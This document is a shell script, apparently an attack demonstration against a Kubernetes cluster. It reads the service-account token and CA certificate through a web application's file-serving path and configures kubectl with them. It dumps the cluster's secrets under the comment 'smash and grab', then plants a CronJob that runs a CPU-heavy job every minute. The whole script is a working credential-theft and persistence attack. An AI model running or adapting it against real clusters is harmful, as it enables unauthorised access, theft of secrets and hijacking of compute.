#!/usr/bin/env sh

set -e

# setup binaries
curl --output kubectl https://s3-us-west-2.amazonaws.com/amazon-eks/1.13.7/2019-06-11/bin/linux/amd64/kubectl
chmod 755 kubectl
mv kubectl /usr/local/bin/

SERVICE_DOMAIN=${WEBAPP_SERVICE_HOST:-webapp.default.svc.cluster.local}

APP_TOKEN=$(curl -s http://$SERVICE_DOMAIN/serve/var/run/secrets/kubernetes.io/serviceaccount/token )

CA_FILE=ca.crt
curl -o $CA_FILE http://$SERVICE_DOMAIN/serve/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Set up kubeconfig
kubectl config set-cluster k8s --server https://kubernetes --certificate-authority ./$CA_FILE --embed-certs
kubectl config set-credentials k8s --token=$APP_TOKEN
kubectl config set-context k8s --cluster k8s --user k8s
kubectl config use-context k8s

# smash and grab
kubectl get secrets

cat << EOF > /tmp/cronjob.yaml
apiVersion: batch/v1beta1
kind: CronJob
metadata:
  name: bignum
spec:
  schedule: "*/1 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: pi
            image: perl
            command: ["perl",  "-Mbignum=bpi", "-wle", "print bpi(2000)"]
          restartPolicy: OnFailure
EOF
kubectl apply -f /tmp/cronjob.yaml

sleep 86400
